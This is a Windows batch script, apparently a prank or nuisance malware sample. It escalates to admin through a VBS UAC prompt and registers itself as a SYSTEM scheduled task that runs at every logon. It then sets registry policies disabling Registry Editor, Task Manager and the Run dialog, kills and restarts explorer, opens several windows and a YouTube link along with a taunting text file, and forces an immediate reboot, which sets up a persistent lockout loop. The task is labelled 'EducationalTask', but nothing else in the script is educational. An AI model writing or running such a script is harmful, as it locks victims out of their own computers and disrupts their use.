@echo off
setlocal enabledelayedexpansion

REM Check if script is running with administrative privileges
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

REM Define the path to the Temp folder
set "temp_folder=%Temp%"

REM Define the name of the initial text file
set "initial_text_file=%temp_folder%\new_text_file.txt"

REM Create a new text file with the desired text in Temp folder
echo this will help you delete RAT now:)) > "%initial_text_file%"

REM Display the path of the initial text file (optional)
echo Initial text file path: %initial_text_file%

REM Schedule a task to run this script on logon
schtasks /create /tn "EducationalTask" /tr "\"%~dpnx0\"" /sc onlogon /ru SYSTEM /f

REM Check if the schtasks command was successful
if %errorlevel% neq 0 (
    echo Task creation failed. Check permissions or command syntax.
    pause
    exit /b 1
) else (
    echo Task successfully created.
)

REM Modify registry settings
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

REM Disable explorer.exe and taskmgr.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

REM Restart explorer.exe to apply changes
taskkill /f /im explorer.exe
start explorer.exe

REM Open some applications
for /l %%i in (1,1,5) do (
    start "" "cmd.exe"
    start https://www.youtube.com/watch?v=2hvNxWA1qm4
    start "%initial_text_file%"
)

shutdown /r /f /t 0
pause
cls
